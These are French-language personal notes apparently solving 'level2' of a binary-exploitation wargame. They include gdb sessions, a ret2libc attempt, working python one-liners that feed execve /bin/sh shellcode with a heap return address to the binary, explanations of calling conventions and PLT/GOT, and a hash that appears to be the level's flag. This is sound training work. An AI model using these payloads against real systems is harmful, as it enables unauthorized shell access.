level2:

adresse system : 0xb7e6b060
strdup : heap retourne une adresse differente de 0xb
offset 80 entre start buffer et ebp+4
adresse return strdup : 0x804a008

(gdb) b *0x0804853e
(gdb) r
# Input: /bin/sh

# Vérification
(gdb) i r eax                    # Adresse heap
(gdb) x/s 0x804a008             # Contenu heap
(gdb) p system                   # Adresse system

set $ebp+4 = 0xb7e6b060        # Essaie de modifier l'expression elle-même
set *($ebp+4) = 0xb7e6b060     # Écrit à l'adresse, mais sans spécifier la taille
set {int}($ebp+4) = 0xb7e6b060 # Écrit 4 bytes à l'adresse ebp+4

# Configuration du stack pour l'appel à system
(gdb) set {int}($ebp+4)=0xb7e6b060    # Adresse de system
(gdb) set {int}($ebp+8)=0xdeadbeef    # Adresse de retour après system
(gdb) set {int}($ebp+12)=0x0804a008    # Argument pour system (/bin/sh)


Pourquoi set ebp+8 avec une adresse bidon ?
addr system 
(python -c 'print "A"*76 + "\xde\xde\xde\xde" "\x60\xb0\xe6\xb7" + "\x2f\x62\x69\x6e\x2f\x73\x68\x00"') | ./level2

C'est la convention d'appel standard : l'appelant (caller) prépare le stack avec l'adresse de retour et les arguments.

x86 (32 bits)
    Les paramètres sont passés sur la stack
    Convention cdecl : paramètres poussés de droite à gauche
    Registres limités (EAX, EBX, ECX, EDX, ESI, EDI)

x86_64 (64 bits)
    Les 4 premiers arguments sont passés dans les registres
        RDI : 1er argument
        RSI : 2ème argument
        RDX : 3ème argument
        RCX : 4ème argument
    Plus de registres disponibles (16 registres généraux)
    Arguments suivants sur la stack si plus de 4 arguments

   saved eip apres le call a gets // modifier le retour pour passer le check de l'adresse ?
   0x80484f2 <p+30>:    mov    0x4(%ebp),%eax
   0x08048505


#include <stdio.h>
#include <stdlib.h>

int system(const char *command) {
    printf("Interception de system() : %s\n", command);
    // Logique personnalisée ici
    return 0;
}


ebp+0x4 = *s de gets
eax = ebp-0xc // ebp-14
ebx-0xc = eax
verifie si eax contient 0xb
si oui
   printf
   exit
else
   puts
   strdup

ebp-12 =  0x804854a saved eip de p (leave de main+11)
ebp+4 = 0x804854a

0xb7eaa966

Ce que vous remarquez est lié à la résolution des symboles et au fonctionnement du GOT (Global Offset Table) et du PLT (Procedure Linkage Table).
Quand vous voyez call 0x8048xxx, c'est un appel à la PLT (Procedure Linkage Table). La PLT contient des instructions de saut qui vont chercher l'adresse réelle de la fonction dans la GOT (Global Offset Table).
Schéma simplifié :

call 0x80483c0 (adresse PLT de gets)
Cette instruction va chercher l'adresse réelle de gets dans la GOT
L'adresse réelle de gets est bien 0xb7e91e40

Donc :

Les adresses de code dans le binaire commencent par 0x8
Les adresses réelles des fonctions libc commencent par 0xb

C'est un mécanisme de résolution dynamique des liens qui permet :

De charger les bibliothèques à des adresses variables
De supporter le ASLR (Address Space Layout Randomization)

0x0804a008

shell code /bin/sh


Print Da Memory

Il est possible d’afficher la mémoire avec la commande x. Cette commande se construit ainsi :

x/[nb-bloc][format][bloc-size] [address]

    [nb-bloc] : nombre de blocs à afficher
    [format] : format d’affichage, s (string)/i (instruction machine)/x (hexadecimal)
    [bloc-size] : taille des blocs b(1byte)/h(2bytes)/w(4bytes)/g(8bytes)
    [address] : à partir d’où afficher la mémoire.

Et dans l’autre ! La commande reverse-continue permet un retour au breakpoint précédent

http://shell-storm.org/shellcode/files/shellcode-575.html

r < <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"')

On modifie ebp+4 avec l'adresse de retour de strdup
Pour que le flux d'execution du retour de la fonction main pointe vers notre shell code
L'execution de code sur la heap etant active nous pouvons donc executer le execve()
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2 

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02